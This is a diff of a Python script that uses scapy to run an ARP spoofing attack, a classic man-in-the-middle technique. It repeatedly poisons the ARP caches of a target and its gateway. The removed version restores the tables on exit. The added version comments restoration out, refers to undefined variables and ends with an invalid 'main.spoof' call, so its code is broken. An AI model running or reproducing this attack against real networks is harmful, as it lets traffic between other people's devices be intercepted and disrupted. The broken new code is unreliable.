@@ -16,51 +16,43 @@
 #                       
 
 
+#!/usr/bin/env python
 
+from __future__ import print_function
 import scapy.all as scapy
 import time
-import sys
 
-def get_mac(ip):
-    arp_req = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_req_broadcast = broadcast/arp_req
-    answered_lst = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
+def main():
+    def get_mac(ip):
+        arp_request = scapy.ARP(pdst=ip)
+        boradcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_braodcast = boradcast / arp_request
+        answered_list = scapy.srp(arp_request_braodcast, timeout=1, verbose=False)[0]
+        return answered_list[0][1].hwsrc
 
-    return answered_lst[0][1].hwsrc
+    def spoof(taget_ip, spoof_ip):
+        target_mac = get_mac(taget_ip)
+        packet= scapy.ARP(op=2,pdst = taget_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
+    '''
+    def restore(destination_ip , source_ip):
+        destination_mac= get_mac(destination_ip)
+        source_mac=get_mac(source_ip)
+        packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+        scapy.send(packet, count=4, verbose=False)
+    '''
+    try:
+        packet_count = 0
+        while True:
+            spoof(target, router)
+            spoof(router, target)
+            packet_count = packet_count + 2
+            print("\r[+]Packets sent: " + str(packet_count), end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[+]Detected CTRL^C....Resetting ARP Tables.....Please wait:)\n")
+        # restore("target", "router")
+        # restore("riuter", "target")
 
-def spoof(target, spoof_ip):
-    target_mac = get_mac(target)
-    list = scapy.ARP(op=2, pdst = target, hwdst =target_mac , psrc = spoof_ip)
-    scapy.send(list, verbose=False)
-
-def restore(dist_ip, source_ip):
-    dist_mac= get_mac(dist_ip)
-    source_mac = get_mac(source_ip)
-    packet= scapy.ARP(op=2, pdst= dist_ip, hwdst=dist_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
-    #print(packet.show())
-    #print(packet.summary())
-
-target_ip = "ip"
-gateway_ip = "gateway_ip"
-
-sent_packets = 0
-try:
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        print("\r[+] Send two packets: " + str(sent_packets)),
-        sys.stdout.flush()
-        sent_packets = sent_packets + 1
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\nProcess killed by user\nsee you again!")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
-except IndexError:
-    print("\nTry again")
-except:
-    print("Run with sudo")
-
-
+if __name__ == "__main__":
+   main.spoof(victim , gateway)
